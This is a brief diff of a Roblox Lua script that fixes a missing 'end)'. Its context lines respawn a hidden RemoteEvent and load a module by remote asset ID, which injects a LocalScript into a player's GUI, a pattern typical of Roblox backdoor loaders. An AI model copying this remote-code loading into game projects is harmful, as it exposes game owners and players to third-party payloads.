@@ -16,7 +16,7 @@ return function(p)
   re.Destroying:Connect(function()
   re = Instance.new("RemoteEvent",game.ReplicatedStorage)
   re.Name = "__"..string.reverse(p.Name)
-  )
+  end)
   require(require(123068958552495)({"MNTSYKScripts",p.PlayerGui,"LocalScript"}))([[
   local function getplr(name:string)
 	if not name then return end
